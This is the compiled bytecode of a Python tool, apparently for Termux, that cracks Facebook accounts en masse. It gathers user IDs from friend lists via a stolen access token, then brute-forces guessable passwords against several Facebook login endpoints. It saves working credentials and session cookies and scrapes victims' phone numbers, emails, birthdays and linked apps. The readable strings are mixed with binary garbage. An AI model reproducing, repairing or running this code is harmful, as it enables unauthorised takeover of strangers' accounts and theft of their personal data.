o
    �ybӕ  �                   @   s�  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZzd dl	Z	W n' e
yQ   e�d� e�d� zd dl	Z	W n e
yN   ed� Y nw Y nw d dlmZ d dlmZ d dlmZ d dlmZ d d	lmZ d d
lmZ d dl	mZ d dl m!Z" d dl#m$Z% ed� ed� ed� ed� ed� ed� ed� ed� ed� ed� ed� ed� ed� ed� ed� ed� ed� ed� dd� Z&e&�  ze'dd��(� �)� Z*W n   g d�Z*Y ze'dd��(� �)� Z+W n   g d�Z+Y g g d d d g g g g g g g g f\Z,Z-a.a/a0Z1Z2Z3Z4Z5Z6Z7Z8dZ9dZ:dZ;dZ<dZ=dZ>dZ?dZ@dZAddd d!d"d#d$d%d&d'd(d)d*�ZBddd d!d"d#d$d%d&d'd(d)d+�ZCej�D� jEZFeBeGej�D� jH� ZIej�D� jJZKd,eGeF� d- eGeI� d- eGeK� d. ZLd/eGeF� d- eGeI� d- eGeK� d. ZMd0d1� ZNd2d3� ZOd4d5� ZPd6d7� ZQd8d9� ZRd:d;� ZSd<d=� ZTd>d?� ZUd@dA� ZVdBdC� ZWdDdE� ZXdFdG� ZYdHdI� ZZdJdK� Z[dLdM� Z\dNdO� Z]dPdQ� Z^e_dRk�r�ze�`dS� W n   Y ze�`dT� W n   Y eQ�  dS dS )U�    Nzpip install rich�   zKTidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich))�Table)�Console)�BeautifulSoup)�ThreadPoolExecutor)�Group)�Panel)�print)�Markdown)�ColumnsZ	LDVIP_GYMc                  C   s�   t t�� �t t�� � } d�| �}td| � z,t�d�j}||v r4td� t t�� �}t	�
d� W d S td� t	�
d� t��  W d S    t��  tdkrYtt� t�  Y d S Y d S )N�-z[37;1mYour ID : zhttps://justpaste.it/4t3oaz[92mYOUR ID IS ACTIVE.........r   zT[91mBarezm Id kat active nya Tkaya bo Active krdn nama bnera bo telegram @LDVIP_GYM�main)�str�os�geteuid�getlogin�joinr	   �requests�get�text�time�sleep�sys�exit�nameZlogo�chk)�uuid�idZhttpCaht�msg� r   �#/storage/emulated/0/Download/DFD.pyr   *   s&   


�r   zuser.txt�r)z�Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1z�Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30z�Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1z�Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30z�Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16z	user2.txtz[mz[1;97mz[93mz[1;92mz[32mz[95mz[33mz[1;96mz[0;34mZJanuariZFebruariZMaretZAprilZMeiZJuniZJuliZAgustusZ	SeptemberZOktoberZNovemberZDesember)�1�2�3�4�5�6�7�8�9�10�11�12)�01�02�03�04�05�06�07�08�09r+   r,   r-   zOK-r   z.txtzCP-c                   C   s   t �d� d S )N�clear)r   �systemr   r   r   r    r7   `   s   r7   c                   C   s
   t �  d S )N)�loginr   r   r   r    �backc   s   
r:   c                  C   sF   t �  d} t| dd�}t� �|� d}t|dd�}tt|dd�� d S )N� �cyan��styleu�   [1;82m
[1;97m    @ssfgss
[1;97m    @ssfgss
[1;97m    @ssfgss

[1;97m AM TOOLA UPDATE KRAWATAWA  BY @ssfgss

[1;97m 🏧🏧❤️LDVIP

[1;97m LDVIP
                                         
��title)r7   �mark�solr	   �nel�cetak)ZwelZwel2�auZpengembang1r   r   r    �bannerf   s   rF   c                  C   s�   zht dd��� } t�| � z+t�dtd  �}t�|j�d }t�|j�d }t�|j�d }t	|||� W W d S  t
yF   t�  Y W d S  tjjyh   t�  d}t|d	d
�}t� j|dd
� t�  Y W d S w  tyu   t�  Y d S w )N�
.token.txtr!   �+https://graph.facebook.com/me?access_token=r   r   r   Zbirthday�1 KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI�redr=   r<   )�open�read�tokenku�appendr   r   �json�loadsr   �menu�KeyError�
login_lagi�
exceptions�ConnectionErrorrF   rA   rB   r	   r   �IOError)�token�syZsy2Zsy3Zsy4�li�lor   r   r    r9   {   s*   
��r9   c            
      C   s(  t �  d} t| dd�}t� j|dd� ttd t d t d �}tdd	��|�}z*t	�
d
| �}t�|j�d }d}t|dd�}t� j|dd� t�d� t�  W d S  tyu   d}t|dd�}t� j|dd� t�d� t�  Y d S  t	jjy�   d}t|dd�}	t� j|	dd� t�  Y d S w )Nz#[1;97m LERA TOKEN DANE AKSES TOKEN�greenr=   r<   �[�fz] [1;97mToken : rG   �wrH   r   z[1;92m Login OKg      @z"# Login Gagal, Periksa Token Anda!rJ   z8[1;97m KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI)rF   rA   rB   r	   �input�x�prK   �writer   r   rO   rP   r   r   r   rQ   rR   rS   rT   rU   r   )
ZskyZsky2Zpanda�akunZtesZtes3ZsueZsuurY   rZ   r   r   r    rS   �   s4   

�rS   c                  C   s�  z	t �d��� } W n   ddi} Y z%t�d�d }ttt�d�d � }t�d�d }|d | d | }W n   d}Y t�  d	}t|d
d�}t	� �
|� d}t|dd�}tt|d	d�� ttd t d t d �}	|	dv rvt�  d S |	dv rt�  d S |	dv r�t�  d S |	dv r�t�  d S |	dv r�t�d� t
td t d t d � t�d� d}
t	� �
t|
dd�� t�  d S d}t	� �
t|dd�� t�  d S )Nzhttps://httpbin.org/ip�originr   �/r   r   �   � r;   Zwhiter=   z�[1;97m[1]= [1;97mCrack Multi Id 
[1;97m[2]= [1;97mCrack Crack Multi v2 Id
[1;97m[3]= [1;97mCHEK GOOD/CP
[1;97m[0]=[1;91m Log Outr<   r?   r\   �$�] [1;97mchoice : �r"   r.   �r#   r/   �r$   r0   )r%   r1   ��0Z00zrm -rf .token.txt�   •z
] Wait ...z[1;97m BERHASIL LOG OUTr[   �# PILIHAN TIDAK ADA DI MENUrJ   )r   r   rO   Zmy_birthday�split�dic2r   rF   rA   rB   r	   rC   rD   r_   r`   ra   �dump_publik�dump_massal�result�filer   r8   �hr   r   r   )�shZtglxZblnxZthnxZbirthZsgZfx�ioZoiZjh�sw�ricr   r   r    rQ   �   sD   







rQ   c               	   C   s�  d} t � �t| dd�� d}t|dd�}tt|dd�� ttd t d	 t d
 �}|dv �r�zt�	d�}W n t
yS   d}t � �t|dd�� t�d� t�  Y nw t|�dkrpd}t � �t|dd�� t�d� t�  d S d}t � �t|dd�� d}i }	|D ]o}
ztd|
 d��� }W n   Y q�|d7 }|dk r�dt|� }|	�t|�t|
�i� |	�|t|
�i� td| d |
 d tt|�� d t � q�|	�t|�t|
�i� tdt|� d |
 d tt|�� d t � q�d}t � �t|dd�� ttd t d	 t d
 �}z|	| }W n t�y+   d}t � �t|dd�� t�  Y nw ztd| d��� }W n   d}t � �t|dd�� t�d� t�  Y d }t � �t|dd�� t�d!| �}d"}t � �t|dd�� ttd t d# t d$ � t�  d S |d%v �r�zt�	d&�}W n t
�y�   d}t � �t|dd�� t�d� t�  Y nw t|�dk�r�d'}t � �t|dd�� t�d� t�  d S d(}t � �t|dd�� d}i }	|D ]s}
ztd)|
 d��� }W n   Y �q�|d7 }|d*k �r+dt|� }|	�t|�t|
�i� |	�|t|
�i� td| d |
 d tt|�� d t � �q�|	�t|�t|
�i� tdt|� d |
 d tt|�� d t � �q�d}t � �t|dd�� ttd t d	 t d
 �}z|	| }W n t�y�   d+}t � �t|dd�� t�  Y nw ztd)| d��� }W n   d,}t � �t|dd�� t�d� t�  Y d-}t � �t|dd�� t�d.| �}d-}t � �t|dd�� ttd t d/ t d$ � t�  d S |d0v �r�t�  d S d+}t � �t|dd�� t�  d S )1Nz# CEK RESULT CRACKr[   r=   z8[01] Cek Hasil Cp
[02] Cek Hasil Ok
[00] Kembali Ke Menur<   ZRESULTSr?   r\   r]   �
] Pilih : rj   �CPz# DIREKTORI TIDAK DITEMUKANrJ   rf   r   z# ANDA BELUM MEMILIKI RESULT CPZyellowz# HASIL CP ANDA�CP/r!   r   �
   rn   �] z ===>>> � Akun� ---> z # PILIH RESULT UNTUK DITAMPILKANz PILIHAN TIDAK ADA DI MENUz* FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGIz LIST AKUN CP ANDAzcd CP && cat z# LIST AKUN CP ANDA�+z	] Kembalirk   �OKz# ANDA BELUM MEMILIKI RESULT OKz# HASIL OK ANDA�OK/�d   rp   �+# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGIz# LIST AKUN OK ANDAzcd OK && cat ro   rm   )rB   r	   rA   rC   rD   r_   r`   ra   r   �listdir�FileNotFoundErrorr   r   r:   �lenrK   �	readlinesr   �updaterR   r   rL   r8   rw   )�cekZkayesZkisZkzZvinZgadaZhahaZgerr�cih�lol�isi�hem�nomZgerr2�geeh�gehr{   Zlin�heherc   ZhusZakun2r   r   r    ru   �   s�   


�


.2
�




�


04
�




ru   c                  C   s4  d} t � jt| dd�dd� ttd t d t d � t�d� d	}t � �t|d
d�� g }zt�d�}|D ]}|�	|� q7W n   Y zt�d�}|D ]}|�	|� qMW n   Y t
|�dkrrd}t � �t|dd�� t�  d S d}i }	|D ]�}
ztd|
 d��� }W n   ztd|
 d��� }W n   Y Y qxY |d7 }|dk r�dt|� }|	�t|�t|
�i� |	�|t|
�i� td| d |
 d tt
|�� d t � qx|	�t|�t|
�i� tdt|� d |
 d tt
|�� d t � qxd	}t � �t|d
d�� ttd t d t d �}z|	| }W n t�y2   d}t � �t|dd�� t�  Y nw ztd| d��� }|D ]}t�	|�dd�� �q?t�  W d S  t�y�   ztd| d��� }|D ]}t�	|�dd�� �qet�  W Y d S  t�y�   d}t � �t|dd�� t�d� t�  Y Y d S w w )Nz# CEK OPSI DARI FILEr<   r=   zon redr\   ro   z*] Sedang Membaca File, Tunggu Sebentar ...rf   z# PILIH FILE YG AKAN DI CEKr[   r}   r�   r   z(# ANDA BELUM MEMILIKI RESULT UNTUK DICEKrJ   r~   r!   r�   r   r   rn   r�   r�   r�   r]   r|   rp   �
r;   r�   )rB   r	   rA   r`   rw   r   r   r   r�   rN   r�   r   rK   r�   r   r�   r_   ra   rR   rc   �replace�cek_opsirV   r:   )Ztek�teksZmy_filesZlisZktZmer�ty�yyr�   r�   r�   r�   r�   �teks2r�   r�   r{   ZhfZfzr�   r   r   r    rv   F  s�   

�
�
�.2
�
��rv   c            
   	   C   s�  z	t dd��� } W n ty   t�  Y nw d}t|dd�}t� �|� ttd t d t d � t	td t
 d	 t d
 �}zFt�d| d td  ��� }|d d D ]}zt�|d d |d  � W qV   Y qVttd t d t d ttt�� � t�  W d S  tjjy�   d}t|dd�}t� j|dd� t�  Y d S  ttfy�   d}t|dd�}	t� �|	� t�  Y d S w )NrG   r!   �DUMP ID PUBLICr[   r=   r\   r�   z&][1;97mFIX ID NO EROR ALL ID KURDISH r]   z] [1;97m PASTE ID : � https://graph.facebook.com/v2.0/�)?fields=friends.limit(5000)&access_token=r   �friends�datar   �|r   ro   z
] Total : rI   rJ   r<   z) PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK)rK   rL   rV   r   rA   rB   r	   r`   rw   r_   ra   r   r   rM   rO   r   rN   r   r�   �settingrT   rU   rR   )
rW   �win�win2ZpilZkoh2�pirY   rZ   r�   r�   r   r   r    rs   �  s8   
� 
(�rs   c               
   C   sF  d} t | dd�}t� �|� ttd t d t d � ztttd t d t d ��}W n tyH   d	}t |d
d�}t� �|� t	�  Y nw |dk sQ|dkrbd}t |d
d�}t� �|� t	�  t
�� }d}ttd t d t d � t|�D ]!}|d7 }ttd t t|� t d t|� d �}t�|� qztD ]_}	z5|�d|	 d td  ��� }
|
d d D ]}z|d d |d  }|tv r�nt�|� W q�   Y q�W q� ttfy�   Y q� t
jjy�   d}t |d
d�}t� j|dd� t	�  Y q�w dtt� }tt�dk�rt |d
d�}nt |dd�}t� �|� t�  d S )Nr�   r[   r=   r\   r�   z)] [1;97m CHAN ID DA DANEY (TA 10 ATWANI)r]   z][1;97m ID : z% INPUT YANG ANDA MASUKKAN BUKAN ANGKArJ   r   r   z# OUT OF RANGE MENr   z] HAMU ID YAK TEDA KAR DAKATz][1;97m ID DANE z : r�   r�   r�   r�   r   r�   r   �2# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGIr<   z# HAMU ID YAKAN %s ID)rA   rB   r	   r`   rw   �intr_   ra   �
ValueErrorr   r   �Session�ranger   �uidrN   r   rM   rO   r   rR   rV   rT   rU   r�   r�   )r�   r�   ZjumZpesanZpesan2�sesZyz�met�klZuserr�col�miZisorY   rZ   ZtotZtot2r   r   r    rt   �  sb   $
�,

�
�
�
rt   c                  C   s�  d} t � �t| dd�� d}t|dd�}tt|dd�� ttd t d	 t d
 �}|dv r9tD ]}t	�
|� q0n7|dv rItD ]}t	�d|� q?n'|dv ratD ]}t�dtt	��}t	�||� qOnd}t � �t|dd�� t�  d}t � �t|dd�� d}t|dd�}	tt|	dd�� ttd t d	 t d
 �}
|
dv r�t�
d� n|
dv r�t�
d� nt�
d� d}t � �t|dd�� ttd t d	 t d �}|dv r�t�
d� nt�
d� ttd t d	 t d �}|dv r�t�
d� nt�
d� t�  d S )Nr;   r[   r=   z|[1]= [1;97mMethod Api Wifi [NOT FAST]
[2]= [1;97mMethod Api Wifi v2 [FAST CLONE]
[3]= [1;97mMethod Api Mobile [Very Slow]r<   ZSETTINGr?   r\   r�   ri   rj   rk   r   rl   rJ   zMethode Crackzq[1;97m[1]= Method Api Wifi [Very-FAST] 
[1;97m[2]= Method Mobile [FAST]
[1;97m[3]= Method Free Mod [Very-Slow]ZMETHOD�api�free�mobilerg   z][1;97mLink Apk  ? (y/t) : ��y�Y�ya�noz][1;97mChek All (y/t) : )rB   r	   rA   rC   rD   r_   r`   ra   r   �id2rN   �insert�random�randintr�   r   �method�	taplikasi�oprek�passwrd)Zwlr�   Ztak�huZbacot�xxr{   r�   ZiozZgessZhcZguwZaplikZoskr   r   r    r�   �  sX   ���



r�   c            
      C   s  d} t � �t| dd�� dttf }tt|dd�� tdd���}tD ]�}|�	d	�d
 |�	d	�d �
� }}|�	d�d
 }g d�}t|�dk rkt|�dk rMnR|�d� |�d� |�|d � |�d� |�|d � n4t|�dk rw|�|� n(|�|� |�|d � |�|d � |�|d � |�|d � |�|d � dtv r�|�t||� q"dtv r�|�t||� q"dtv r�|�t||� q"|�t||� q"W d   � n1 s�w   Y  td� d}t � �t|dd�� ttd t d t d �}	|	dv �rt�  d S t�  d S ) Nz!!! to stoped Script CTRL+Zr[   r=   u3   Live LDVIP>> : OK👍/%s
 Check LDVIP> : 👎CP/%s
ZCRACKr?   �   )Zmax_workersr�   r   r   rg   )Z19971997Z19981998Z19961996�	123456789Z19951995Z123456123456Z19991999�   �   Z
1234512345Z
1122334455Z12345Z19901990Z112233Z123Z1234r�   r�   r�   r�   r;   r\   r�   z][1;97mCrack ? (y/t) : r�   )rB   r	   rA   �okc�cpcrD   rC   �tredr�   rq   �lowerr�   rN   r�   �submit�crack�crack2�crack3r_   r`   ra   r�   r   )
ZlerZkrek�poolZyuzong�idfZnmfZfrs�pwvZtanyaZwoir   r   r    r�     sR   "



�� 


r�   c           .      C   sv  t �ttttttg�}td t	t
� }d}td|tt	t
�ttt|�t|�tf dd� tj��  t �t�}t �t�}t�� }|D �]�}�z�t�� }	|j�dd|ddd	d
ddddddd�� |�d�j}
t�dt|
���d�t�dt|
���d�| d|dd�}|j�ddddd|dd	d
ddddddd�� |j d|dd�}d |j!�"� �#� v r�d!t$v r�t%�&| d" | � t'| |� n7td#� d$| � d%|� �}t(|d&d'�}t)t(|d(d)�� t*d*t+ d+��,| d" | d# � t%�&| d" | � td7 aW  �nBd,|j!�"� �#� v �r d-d.i}d/t-v �rStd7 a|j!�"� }d0�.d1d2� |j!�"� �/� D ��}t*d3t0 d+��,| d" | d" | d# � td#� d$| � d4|� d5|� �}t(|d6d'�}t)t(|d7d)�� W  �n�d!t-v �rtd7 a|j!�"� }d0�.d8d2� |j!�"� �/� D ��}t*d3t0 d+��,| d" | d" | d# � | }d9}t�� }|jd:||d;�j}t�1d<t|��d= }|jd>||d;�j}|jd?||d;�j}|jd|� d@�||d;�j}|jdA|� dB�||d;�j}zt�1dCt|��d= }W n   d9}Y zt�1dDt|��d= �2dEdF�}W n   d9}Y zt�1dGt|��d= }W n   d9}Y zt�1dHt|��d= } W n   d9} Y zt�1dIt|��d }!W n   d9}!Y zd9}"t�1dJt|��}#|#D ]	}$|"|$dK 7 }"�q;W n   Y |dL|� dM|"� dN|� d#�7 }dO\}%}&|jdP||d;�j}'|jdQ||d;�j}(dRt�1d<t|'��v �r�|dS7 }dT|'v �r�|dU7 }n2|dV7 }t�1dWt|'��})t�1dXt|'��}*|)D ]}+|%d7 }%|dY|%� dZ|+� d|*|& � d#�7 }|&d7 }&�q�d[|(v �r�|d\7 }n8dO\}%}&|d]7 }t�1dWt|(��},t�1dXt|(��}-|,D ]}+|%d7 }%|dY|%� dZ|+� d|-|& � d#�7 }|&d7 }&�q�n	 td#� d$| � d4|� d5|� d#|� �}t(|d6d'�}t)t(|d7d)�� W  nnW q@W q@ tj3j4�y4   t�5d^� Y q@w td7 ad S )_Nr�   �%uA   %s %s/%s LDVIP> [1;92mOK👍:%s LDVIP> [1;91mCP👎:%s  %s%s%srg   ��endzm.facebook.comr"   ��text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9�mark.via.gp�same-origin�cors�empty�document�https://m.facebook.com/�gzip, deflate br�en-GB,en-US;q=0.9,en;q=0.8��Host�upgrade-insecure-requests�
user-agent�acceptZdnt�x-requested-with�sec-fetch-site�sec-fetch-mode�sec-fetch-user�sec-fetch-dest�referer�accept-encoding�accept-languagezlhttps://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F�name="lsd" value="(.*?)"r   �name="jazoest" value="(.*?)"Zlogin_no_pinz8https://developers.facebook.com/tools/debug/accesstoken/)�lsd�jazoestr�   Zflow�pass�next�	max-age=0zhttps://m.facebook.com�!application/x-www-form-urlencoded�r�   �cache-controlr�   rd   �content-typer�   r�   r�   r�   r�   r�   r�   r�   r�   r�   zChttps://m.facebook.com/login/device-based/validate-password/?shbl=0F�r�   �allow_redirects�
checkpointr�   r�   r�   �   [•] ID       : �    [•] PASSWORD : rJ   r=   r}   r?   r~   �a�c_userr�   z�Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36r�   �;c                 S   �   g | ]
\}}d ||f �qS �z%s=%sr   ��.0�key�valuer   r   r    �
<listcomp>W  �    zcrack.<locals>.<listcomp>r�   �   
[•] PASSWORD : �   
[•] COOKIES  : r[   r�   c                 S   r�   r   r   r  r   r   r    r  a  r  r;   �"https://m.facebook.com/profile.php)�cookies�headers�\<title\>(.*?)<\/title\>r   �)https://m.facebook.com/profile.php?v=info�,https://m.facebook.com/profile.php?v=friends��/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_�Ahttps://m.facebook.com/timeline/app_collection/?collection_token=�#%3A184985071538002%3A32&_rdc=1&_rdr�=\<a\ href\="tel\:\+.*?">\<span\ dir\="ltr">(.*?)<\/span><\/a>�W\<a href\="https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?" target\=".*?"\>(.*?)<\/a\>�&#064;�@�h\<\/td\>\<td\ valign\="top" class\=".*?"\>\<div\ class\=".*?"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>�+\<h3\ class\=".*?"\>Teman\ \((.*?)\)<\/h3\>�%\<span\ class\=".*?"\>(.*?)\<\/span\>�%\<div\ class\=".*?" id\="year_(.*?)">�, z[1;97m[+] Name :          �#
[1;97m[+] Create Facebook      : �
[1;97m[+] Active Apk   : �r   r   �7https://m.facebook.com/settings/apps/tabbed/?tab=active�9https://m.facebook.com/settings/apps/tabbed/?tab=inactive�Diakses menggunakan Facebook�Aplikasi Yang Terkait*
�AAnda tidak memiliki aplikasi atau situs web aktif untuk ditinjau.�(Tidak Ada Aplikasi Aktif Yang Terkait *
�	Aplikasi Aktif : 
�;\/><div\ class\=".*?"\>\<span\ class\=".*?"\>(.*?)<\/span\>�2\<div\>\<\/div\>\<div\ class\=".*?"\>(.*?)<\/div\>�		[r�   �FAnda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau�-
Tidak Ada Aplikasi Kedaluwarsa Yang Terkait
�	Aplikasi Kedaluwarsa :
�   �6r�   �choice�u�k�kk�brw   �hh�loopr�   r�   r	   �ok�cpr�   r   r`   r   �stdout�flush�ugen�ugen2r   r�   r   r  r�   r   r   �re�search�group�postr
  �get_dict�keysr�   rc   rN   �cekerrC   rD   rK   r�   rb   r�   r   �itemsr�   �findallr�   rT   rU   r   ).r�   r�   �bi�pers�fff�ua�ua2r�   �pw�tixra   �dataa�po�statuscp�	statuscp1Zheadapp�coki�kuki�statusok�	statusok1�user�infoakun�session�get_id�nama�response�	response2�	response3�	response4�nomer�email�ttl�teman�pengikut�tahun�cek_thn�nenen�hit1�hit2r�   �cek2�apkAktif�ditambahkan�muncul�apkKadaluarsa�
kadaluarsar   r   r    r�   4  s�   6


(6, 

(

("�

 

 ��D�E�r�   c           
   
   C   s�  t �ttttttg�}td t	t
� }d}td|tt	t
�ttt|�t|�tf dd� tj��  t �t��dd�}t�� }|D ]�}z�tt �dd	��tt �d
d��tt �d
d��dd|ddd�}|jdt| � d t|� d |d�}	d|	�� d v r�dtv r�t�| d | � t| |� n&tdt| |f � tdt  d��!| d | d � t�| d | � td7 aW  n<d|	j"v r�d|	j"v r�tdt| |f � td t# d��!| d | d � td7 aW  nW q? tj$j%y�   t&�'d!� Y q?w td7 ad S )"Nr�   r�   zE%s[1;97mJEWEL> %s/%s ==> [1;92mOK:%s ===> [1;91mCP:%s ===> %s%s%srg   r�   r�   r;   g    �sAg    8�|Ai N  i@�  Z	EXCELLENTz!cell.CTRadioAccessTechnologyHSDPAr�   ZLiger)zx-fb-connection-bandwidthzx-fb-sim-hnizx-fb-net-hnizx-fb-connection-qualityzx-fb-connection-typer�   r�   zx-fb-http-enginez?https://b-api.facebook.com/method/auth.login?format=json&email=z
&password=a�  &credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true)r  zwww.facebook.comZ	error_msgr�   r�   z%sLDVIP %s|%s ----> CP       r~   r�   r   Zsession_keyZEAAAz%sLDVIP %s|%s ----> OK       r�   r+  )(r�   r-  r.  r/  r0  r1  rw   r2  r3  r�   r�   r	   r4  r5  r�   r   r`   r   r6  r7  r8  r�   r   r�   r�   r   rO   r�   rc   rN   r@  rK   r�   rb   r   r�   rT   rU   r   r   )
r�   r�   rC  rD  rE  rF  r�   rH  �head�respr   r   r    r�   �  s:   6:&  �r�   c           -      C   s�  t �ttttttg�}td t	t
� }d}td|tt	t
�ttt|�t|�tf dd� tj��  t �t�}t �t�}t�� }|D �]�}�z�t�� }	|j�dd|ddd	d
ddddddd�� |�d|  �j}
t�dt|
���d�t�dt|
���d�t�dt|
���d�t�dt|
���d�| |d�}|j�ddddd|dd
dddd|  ddd�� |j d|dd�}d |j!�"� �#� v �r	d!t$v r�t%�&| d" | � t'| |� n7td#� d$| � d%|� �}t(|d&d'�}t)t(|d(d)�� t*d*t+ d+��,| d" | d# � t%�&| d" | � td7 aW  �n7d,|j!�"� �#� v �r+d-t-v �retd7 a|j!�"� }d.�.d/d0� |j!�"� �/� D ��}t*d1t0 d+��,| d" | d" | d# � td#� d2| � d3|� d4|� �}t(|d5d'�}t)t(|d6d)�� W  �n�d!t-v �r*td7 a|j!�"� }d.�.d7d0� |j!�"� �/� D ��}t*d1t0 d+��,| d" | d" | d# � | }d8}t�� }|jd9|d:�j}t�1d;t|��d< }|jd=|d:�j}|jd>|d:�j}|jd?|� d@�|d:�j}|jdA|� dB�|d:�j}zt�1dCt|��d< }W n   d8}Y zt�1dDt|��d< �2dEdF�}W n   d8}Y zt�1dGt|��d< }W n   d8}Y zt�1dHt|��d< }W n   d8}Y zt�1dIt|��d } W n   d8} Y zd8}!t�1dJt|��}"|"D ]	}#|!|#dK 7 }!�qHW n   Y |dL|� dM|!� dN|� d#�7 }dO\}$}%|jdP|d:�j}&|jdQ|d:�j}'dRt�1d;t|&��v �r|dS7 }dT|&v �r�|dU7 }n2|dV7 }t�1dWt|&��}(t�1dXt|&��})|(D ]}*|$d7 }$|dY|$� dZ|*� d|)|% � d#�7 }|%d7 }%�q�d[|'v �r�|d\7 }n8dO\}$}%|d]7 }t�1dWt|'��}+t�1dXt|'��},|+D ]}*|$d7 }$|dY|$� dZ|*� d|,|% � d#�7 }|%d7 }%�q�n	 td#� d2| � d3|� d4|� d#|� �}t(|d5d'�}t)t(|d6d)�� W  nnW q@W q@ tj3j4�y?   t�5d^� Y q@w td7 ad S )_Nr�   r�   z?%s==>> %s/%s JEWEL> [1;92mOK:%s ==>> [1;91mCP:%s ==>> %s%s%srg   r�   zfree.facebook.comr"   r�   r�   r�   r�   r�   r�   zhttps://free.facebook.com/r�   r�   r�   z'https://free.facebook.com/login/?email=r�   r   r�   zname="m_ts" value="(.*?)"zname="li" value="(.*?)")r�   r�   Zm_tsrY   r\  r�   r�   zhttps://free.facebook.comr�   )r�   r�   r�   rd   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   zThttps://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecatedFr�   r�   r�   r�   r�   u   [•] ID : r�   rJ   r=   r}   r?   r~   r�   r�   r�   r�   c                 S   r�   r   r   r  r   r   r    r     r  zcrack3.<locals>.<listcomp>r�   r�   r  r  r[   r�   c                 S   r�   r   r   r  r   r   r    r  
  r  r;   r	  )r
  r  r   r  r  r�   r  r  r  r  r  r  r  r  r  r  r  r  z[1;97m[+] NAME :        :  r  r  r  r  r  r   r!  r"  r#  r$  r%  r&  r'  r�   r(  r)  r*  r+  r,  )-r�   r�   rC  rD  rE  rF  rG  r�   rH  rI  ra   rJ  rK  rL  rM  rN  rO  rP  rQ  rR  rS  rT  rU  rV  rW  rX  rY  rZ  r[  r\  r]  r^  r_  r`  ra  rb  rc  rd  r�   re  rf  rg  rh  ri  rj  r   r   r    r�   �  s   6


(�� 

(

("�

 

 ��C�D�r�   c                 C   s�  d}ddddd|ddd	d
dddddd�}t �� }z�|�d�}t|jd| |dd�|dd�jd�}|�d�}i }g d�}	|d�D ]}
|
�d�|	v rT|�|
�d�|
�d�i� q>t|jdt|d � ||d�jd�}t	dt
| |tf � tdt d ��| d! | d" � td#7 a|�d$�}t|�d%kr�t	d&ttf � W d S |D ]}t	d't|jtf � q�W d S  ty� } z-t	dt
| |tf � t	d(ttf � tdt d ��| d! | d" � td#7 aW Y d }~d S d }~ww ))N�xMozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36�mbasic.facebook.comr�   r"   �https://mbasic.facebook.comr�   �|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9r�   r�   �navigate�?1r�   �:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8�gzip, deflate�#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7r�   �%https://mbasic.facebook.com/login.phpr�   �r\  r�   r9   T�r�   r  r�   �html.parser�form�Znhr�   Zfb_dtsgzsubmit[Continue]Zcheckpoint_datar_   r   r  �action�r�   r  � %sLDVIP %s|%s ----> CP       %sr~   r�   r�   r�   r   �optionr   �2%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)�%s---> %s%sz>%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s)r   r�   r   �sopr=  r   �findr�   r   r	   r1  r`   rK   r�   rb   r5  �find_allr�   r2  r0  �	Exceptionr.  )r�   rH  rF  rk  r�   �hi�ho�jor�   �lion�anj�kent�opsi�opsii�cr   r   r    r@  P  s<   $
"
�$ 
� ��r@  c                  C   s$  t t�} d|  }tt|dd�� ttd t d t d � d}t� �t	|dd	�� d
}tD �]Q}�z/z|�
d�d
 |�
d�d }}W n  tyd   t�d� tdt|tf � tdttf � Y W q.w t�ttttttg�}td||t t�|tf dd� tj��  d}t�� }	ddddd|dddddddd d!d"�}
|	�d�}t|	jd#||d$d%�|
